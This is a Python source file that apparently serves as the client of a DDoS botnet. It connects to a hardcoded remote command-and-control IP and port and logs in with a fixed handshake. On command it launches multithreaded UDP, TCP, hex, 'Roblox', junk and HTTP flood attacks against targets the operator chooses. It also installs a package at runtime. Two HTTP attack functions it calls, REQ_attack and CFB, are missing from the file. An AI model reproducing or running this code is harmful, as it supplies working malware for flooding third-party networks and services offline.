import subprocess
import sys
subprocess.check_call([sys.executable, "-m", "pip", "install", "cloudscraper"])
import socket
import threading
import time
import random
import cloudscraper
import requests
import ctypes

C2_ADDRESS = "147.185.221.27"
C2_PORT = 4887

def attack_udp(ip, port, secs, size=65500):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        data = random._urandom(size)
        s.sendto(data, (ip, dport))

def attack_tcp(ip, port, secs, size=65500):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            while time.time() < secs:
                s.send(random._urandom(size))
        except:
            pass

def attack_tup(ip, port, secs, size=65500):
    while time.time() < secs:
        udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        dport = random.randint(1, 65535) if port == 0 else port
        try:
            data = random._urandom(size)
            tcp.connect((ip, port))
            udp.sendto(data, (ip, dport))
            tcp.send(data)
        except:
            pass

def attack_hex(ip, port, secs):
    payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))

def attack_roblox(ip, port, secs, size=65400):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(size)
        dport = random.randint(1, 65535) if port == 0 else port
        for _ in range(1500):
            ran = random.randrange(10 ** 80)
            hex = "%064x" % ran
            hex = hex[:64]
            s.sendto(bytes.fromhex(hex) + bytes, (ip, dport))

def attack_junk(ip, port, secs):
    payload = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))

def handle_c2_connection(c2):
    try:
        c2.send('669787761736865726500'.encode())
        while True:
            time.sleep(1)
            data = c2.recv(1024).decode()
            if 'Username' in data:
                c2.send('BOT'.encode())
                break
        while True:
            time.sleep(1)
            data = c2.recv(1024).decode()
            if 'Password' in data:
                c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                break
        while True:
            data = c2.recv(1024).decode().strip()
            if not data:
                raise Exception
            args = data.split(' ')
            command = args[0].upper()
            if command == '!UDP':
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])
                for _ in range(threads):
                    threading.Thread(target=attack_udp, args=(ip, port, secs), daemon=True).start()
            elif command == '!TCP':
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])
                for _ in range(threads):
                    threading.Thread(target=attack_tcp, args=(ip, port, secs), daemon=True).start()
            elif command == '!HEX':
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])
                for _ in range(threads):
                    threading.Thread(target=attack_hex, args=(ip, port, secs), daemon=True).start()
            elif command == '!ROBLOX':
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])
                for _ in range(threads):
                    threading.Thread(target=attack_roblox, args=(ip, port, secs), daemon=True).start()
            elif command == '!JUNK':
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])
                for _ in range(threads):
                    threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()
                    threading.Thread(target=attack_udp, args=(ip, port, secs), daemon=True).start()
                    threading.Thread(target=attack_tcp, args=(ip, port, secs), daemon=True).start()
            elif command == "!HTTP_REQ":
                url = args[1]
                port = args[2]
                secs = time.time() + int(args[3])
                threads = int(args[4])
                for _ in range(threads):
                    threading.Thread(target=REQ_attack, args=(url, secs, port), daemon=True).start()
            elif command == "!HTTP_CFB":
                url = args[1]
                port = args[2]
                secs = time.time() + int(args[3])
                threads = int(args[4])
                for _ in range(threads):
                    threading.Thread(target=CFB, args=(url, secs, port), daemon=True).start()
            elif command == 'PING':
                c2.send('PONG'.encode())
    except:
        c2.close()

def reconnect_thread():
    while True:
        try:
            c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            c2.connect((C2_ADDRESS, C2_PORT))
            threading.Thread(target=handle_c2_connection, args=(c2,), daemon=True).start()
        except:
            if 'c2' in locals():
                c2.close()
        time.sleep(1)

def main():
    while True:
        try:
            print("Starting script...")
            threading.Thread(target=reconnect_thread, daemon=True).start()
            while True:
                time.sleep(30)
        except Exception as e:
            print(f"Error occurred: {e}")
        finally:
            print("Restarted script")
            time.sleep(30)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("Script terminated by user")
    except Exception as e:
        print(f"Fatal error: {e}")
